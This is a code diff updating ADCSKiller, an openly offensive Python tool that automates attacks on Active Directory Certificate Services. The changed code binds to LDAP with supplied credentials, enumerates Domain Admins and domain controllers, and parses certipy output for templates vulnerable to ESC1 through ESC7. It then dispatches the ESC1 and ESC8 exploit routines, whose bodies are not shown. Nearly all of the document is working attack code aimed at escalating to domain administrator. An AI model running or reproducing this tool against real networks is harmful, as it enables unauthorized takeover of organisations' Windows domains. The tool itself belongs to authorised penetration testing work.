@@ -33,7 +33,7 @@ SOFTWARE.
 
 __author__ = "grimlockx"
 __license__ = "MIT"
-__version__ = "0.2.1"
+__version__ = "0.2.2"
 
 
 import argparse
@@ -112,40 +112,40 @@ class Exploit:
                 for d in self.__domain_parts[:-1]:
                     certipy_results = subprocess.run(["certipy", "find", "-u", f"{self.__username}@{d}", "-p", self.__password, "-dc-ip", self.__target, "-vulnerable", "-json", "-output", f"{self.__certipy_output_prefix}"], capture_output=True, text=True).stdout
                     if not re.search(rf'Invalid credentials', certipy_results):
-                        print(f"[+] Saved certipy output to {self.__certipy_output_prefix}_Certipy.json")          
+                        print(f'[+] Saved certipy output to {self.__certipy_output_prefix}_Certipy.json\n')          
                         return True
                     
                 return False
             return False
         
-        print(f"[+] Saved certipy output to {self.__certipy_output_prefix}_Certipy.json")          
+        print(f'[+] Saved certipy output to {self.__certipy_output_prefix}_Certipy.json\n')          
         return True
     
     def bind_to_ldap(self) -> None:
         # Connect & bind to LDAP
-        print(f"[*] Trying to bind to ldap://{self.__target}:389")
+        print(f'[*] Trying to bind to ldap://{self.__target}:389')
         l_server = ldap3.Server(f'ldap://{self.__target}:389', get_info=ldap3.ALL)
         try:
             self.__ldap_bind = ldap3.Connection(l_server, user=f'{self.__domain_parts[0]}\\{self.__username}', password=f'{self.__password}', auto_bind=True)
-            print(f"[+] Bind to ldap://{self.__target}:389 successful")
+            print(f'[+] Bind to ldap://{self.__target}:389 successful\n')
         except ldap3.core.exceptions.LDAPSocketOpenError:
-            print(f"[-] Binding to ldap://{self.__target}:389 failed")
-            print(f"[*] Trying to bind to ldaps://{self.__target}:636")
+            print(f'[-] Binding to ldap://{self.__target}:389 failed\n')
+            print(f'[*] Trying to bind to ldaps://{self.__target}:636')
             l_server = ldap3.Server(f'ldaps://{self.__target}:636', get_info=ldap3.ALL)
             try:
                 self.__ldap_bind = ldap3.Connection(l_server, user=f'{self.__domain_parts[0]}\\{self.__username}', password=f'{self.__password}', auto_bind=True)
-                print(f"[+] Bind to ldaps://{self.__target}:636 successful")
+                print(f'[+] Bind to ldaps://{self.__target}:636 successful\n')
             except ldap3.core.exceptions.LDAPSocketOpenError:
-                print(f"[-] Binding to ldaps://{self.__target}:636 failed\n")
+                print(f'[-] Binding to ldaps://{self.__target}:636 failed\n')
                 return False
             except ldap3.core.exceptions.LDAPBindError:
-                print(f"[-] Binding to ldaps://{self.__target}:636 failed, invalid credentials\n")
+                print(f'[-] Binding to ldaps://{self.__target}:636 failed, invalid credentials\n')
                 return False
         except ldap3.core.exceptions.LDAPBindError:
-            print(f"[-] Binding to ldap://{self.__target}:389 failed, invalid credentials\n")
+            print(f'[-] Binding to ldap://{self.__target}:389 failed, invalid credentials\n')
             return False
         except ldap3.core.exceptions.LDAPSocketOpenError:
-            print(f"[-] Binding to ldap://{self.__target}:389 failed, connection timed out\n")
+            print(f'[-] Binding to ldap://{self.__target}:389 failed, connection timed out\n')
             return False
 
     
@@ -155,11 +155,11 @@ class Exploit:
         self.__domain_SID = self.__ldap_bind.response[0]['attributes']['objectSid']
         print(f"[+] Received Domain SID: {self.__domain_SID}")
 
-        print(f"[*] Getting Domain Administrators CN of {self.__domain} using objectSID: {self.__domain_SID}-512")
+        print(f"[*] Getting Domain Administrators Group Common Name of {self.__domain} using objectSID: {self.__domain_SID}-512")
         self.__ldap_bind.search(search_base = f'{self.__domain_cn}', search_filter = f'(&(objectCategory=group)(objectSid={self.__domain_SID}-512))', attributes = ['sAMAccountName'])
         self.__domain_admins_cn =  self.__ldap_bind.response[0]['raw_attributes']['sAMAccountName'][0].decode("utf-8")
 
-        print(f"[*] Getting Domain Administrators of {self.__domain} using Common Name '{self.__domain_admins_cn}'")
+        print(f"[*] Getting Domain Administrators of {self.__domain} using Common Name: {self.__domain_admins_cn}")
         self.__ldap_bind.search(search_base = f'{self.__domain_cn}', search_filter = f'(&(objectCategory=group)(cn={self.__domain_admins_cn}))', attributes = ['member'])
         for entry in self.__ldap_bind.response[0]['raw_attributes']['member']:
             parsed_entry = entry.decode('utf-8').split(',')
@@ -167,7 +167,7 @@ class Exploit:
 
         # Fallback LDAP search if searching via sid did not return any results
         if not self.__domain_admins:
-            print(f"[*] Getting Domain Administrators of {self.__domain} using Common Name 'Domain Admins'")
+            print(f"[*] Getting Domain Administrators of {self.__domain} using Common Name Domain Admins")
             self.__ldap_bind.search(search_base = f'{self.__domain_cn}', search_filter = f'(memberOf=cn=Domain Admins,OU=Groups,{self.__domain_cn})', attributes = ['sAMAccountName'])
             for entry in self.__ldap_bind.response:
                 try:
@@ -177,71 +177,49 @@ class Exploit:
                     continue
 
         if self.__domain_admins:
-            print(f"[+] Found Domain Administrators: {self.__domain_admins}\n")
+            print(f'[+] Found Domain Administrators: {", ".join(self.__domain_admins)}\n')
             return self.__domain_admins
         
-        print(f"[-] Could not enumerate Domain Administrators")
+        print(f'[-] Could not enumerate Domain Administrators\n')
         return self.__domain_admins
 
     def fetch_certipy_results(self) -> dict:
-        print(f"[+] Parsing certipy output {self.__certipy_output_prefix}_Certipy.json\n")
+        print(f"[+] Parsing certipy output {self.__certipy_output_prefix}_Certipy.json")
         try:
             with open(f"{self.__certipy_output_prefix}_Certipy.json", "r") as file:
                 certipy_json = json.load(file)
 
-        except Exception as e:
-            # TODO tests and exceptions
-            print(e)
+        except (FileNotFoundError, IOError, json.JSONDecodeError) as e:
+            print(f"[-] Error reading Certipy JSON file: {e}")
+            return {}
 
-        # Get target CA
-        self.__ca = certipy_json["Certificate Authorities"]['0']['CA Name']
-        self.__ca_dns = certipy_json["Certificate Authorities"]['0']['DNS Name']
+        self.__ca = certipy_json["Certificate Authorities"]["0"]["CA Name"]
+        self.__ca_dns = certipy_json["Certificate Authorities"]["0"]["DNS Name"]
 
-        # Get Vulnerabilities 
-        if 'ESC8' in certipy_json:
-            if certipy_json["Certificate Authorities"]['0']['[!] Vulnerabilities']['ESC8']:
-                self.__vulns.append('ESC8')
+        vulnerabilities = certipy_json["Certificate Authorities"]["0"].get("[!] Vulnerabilities", {})
+        self.__vulns = [key for key, value in vulnerabilities.items() if value]
 
-        if 'ESC11' in certipy_json:  
-            if certipy_json["Certificate Authorities"]['0']['[!] Vulnerabilities']['ESC11']:
-                self.__vulns.append('ESC11')
-            
         if self.__vulns:
-            print(f'[+] Found vulnerabilities: {self.__vulns}')
+            print(f"[+] Found vulnerabilities: {self.__vulns}\n")
 
         templates = certipy_json['Certificate Templates']
         
         for template in templates.values():
             if "[!] Vulnerabilities" in template:
                 vulnerabilities = template["[!] Vulnerabilities"]
-                if "ESC1" in vulnerabilities:
-                    if "ESC1" not in self.__vulnerable_certificate_templates:
-                        self.__vulnerable_certificate_templates["ESC1"] = []
+                for i in range(1, 8):
+                    if f'ESC{i}' in vulnerabilities:
+                        if f'ESC{i}' not in self.__vulnerable_certificate_templates:
+                            self.__vulnerable_certificate_templates[f'ESC{i}'] = []
                     
-                    self.__vulnerable_certificate_templates["ESC1"].append(template["Template Name"])
-
-                if "ESC2" in vulnerabilities:
-                    if "ESC2" not in self.__vulnerable_certificate_templates:
-                        self.__vulnerable_certificate_templates["ESC2"] = []
-                    
-                    self.__vulnerable_certificate_templates["ESC2"].append(template["Template Name"])
-
-                if "ESC3" in vulnerabilities:
-                    if "ESC3" not in self.__vulnerable_certificate_templates:
-                        self.__vulnerable_certificate_templates["ESC3"] = []
-                    
-                    self.__vulnerable_certificate_templates["ESC3"].append(template["Template Name"])
-
-                if "ESC4" in vulnerabilities:
-                    if "ESC4" not in self.__vulnerable_certificate_templates:
-                        self.__vulnerable_certificate_templates["ESC4"] = []
-                    
-                    self.__vulnerable_certificate_templates["ESC4"].append(template["Template Name"])
+                        self.__vulnerable_certificate_templates[f'ESC{i}'].append(template["Template Name"])
 
         if self.__vulnerable_certificate_templates:
             print('[+] Found vulnerable certificate templates')
-            print(self.__vulnerable_certificate_templates)
-                    
+            for key in self.__vulnerable_certificate_templates.keys():
+                print(f'[+] Certificate templates vulnerable to {key}: {" ,".join(self.__vulnerable_certificate_templates[key])}')
+
+        print()   
         return self.__vulnerable_certificate_templates
     
     def get_dcs(self) -> None:
@@ -256,14 +234,24 @@ class Exploit:
                 continue
                 
         if self.__dc:
-            print(f'[+] Found domain controllers: {self.__dc}')
+            print(f'[+] Found domain controllers: {", ".join(self.__dc)}\n')
 
-    def run_checks(self) -> None:
-        if "ESC1" in self.__vulnerable_certificate_templates:
-            self.exploit_esc1()
+    def run_exploits(self) -> None:
+        certificate_exploits = {
+            "ESC1": self.exploit_esc1
+        }
 
-        if "ESC8" in self.__vulns:
-            self.exploit_esc8()
+        environment_exploits = {
+            "ESC8": self.exploit_esc8
+        }
+
+        for vuln in self.__vulnerable_certificate_templates:
+            if vuln in certificate_exploits:
+                certificate_exploits[vuln]()
+
+        for vuln in self.__vulns:
+            if vuln in environment_exploits:
+                environment_exploits[vuln]()      
 
     def exploit_esc1(self) -> None:
         for admin in self.__domain_admins:
@@ -323,7 +311,7 @@ if __name__ == "__main__":
 
         """)
 
-    print("\nADCSKiller v0.2.1 - by Maurice Fielenbach (grimlockx) - Hexastrike Cybersecurity UG (haftungsbeschränkt)\n")
+    print("\nADCSKiller v0.2.2 - by Maurice Fielenbach (grimlockx) - Hexastrike Cybersecurity UG (haftungsbeschränkt)\n")
     parser = argparse.ArgumentParser()
     parser.add_argument('-d', '--domain', dest='domain',type=str, required=True, help='Target domain name. Use FQDN')
     parser.add_argument('-u', '--username', dest='username',type=str, required=True, help='Username')
@@ -339,4 +327,4 @@ if __name__ == "__main__":
     exploit.get_domain_admins()
     exploit.fetch_certipy_results()
     exploit.get_dcs()
-    exploit.run_checks()
+    exploit.run_exploits()
